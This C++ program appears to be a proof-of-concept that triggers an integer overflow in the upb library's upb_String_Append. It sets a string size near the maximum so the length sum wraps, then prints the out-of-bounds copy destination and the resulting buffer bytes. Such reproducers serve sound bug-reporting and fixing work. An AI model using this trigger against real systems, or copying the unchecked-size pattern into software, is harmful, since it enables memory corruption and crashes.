#include <cstddef>
#include <cstdint>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <limits>

extern "C" {
#include "upb/io/string.h"
}

int main() {
  std::cout << std::unitbuf;
  alignas(16) char storage[16] = {};
  upb_String s = {};
  const char payload[] = "OVERFLOW";
  const size_t append_size = 8;

  s.size_ = std::numeric_limits<size_t>::max() - 3;
  s.capacity_ = sizeof(storage);
  s.data_ = storage;
  s.arena_ = nullptr;
  std::memset(storage, 0, sizeof(storage));

  const size_t wrapped_sum = s.size_ + append_size;
  const bool reserve_branch = s.capacity_ <= wrapped_sum;
  const size_t wrapped_new_cap = 2 * wrapped_sum + 1;
  const uintptr_t storage_addr = reinterpret_cast<uintptr_t>(storage);
  const uintptr_t copy_dest_addr = storage_addr + s.size_;
  const intptr_t copy_dest_delta =
      static_cast<intptr_t>(copy_dest_addr - storage_addr);

  std::cout << "before.size=" << s.size_ << "\n";
  std::cout << "append.size=" << append_size << "\n";
  std::cout << "wrapped.sum=" << wrapped_sum << "\n";
  std::cout << "reserve.branch=" << reserve_branch << "\n";
  std::cout << "wrapped.new_cap=" << wrapped_new_cap << "\n";
  std::cout << "storage.addr=0x" << std::hex << storage_addr << "\n";
  std::cout << "copy.dest=0x" << std::hex << copy_dest_addr << "\n";
  std::cout << "copy.dest_delta=" << std::dec << copy_dest_delta << "\n";

  const bool ok = upb_String_Append(&s, payload, append_size);

  std::cout << "append.ok=" << ok << "\n";
  std::cout << "after.size=" << s.size_ << "\n";
  std::cout << "storage.bytes=";
  for (unsigned char byte : storage) {
    std::cout << std::hex << std::setw(2) << std::setfill('0')
              << static_cast<unsigned int>(byte) << ' ';
  }
  std::cout << std::dec << "\n";
  return ok ? 0 : 1;
}
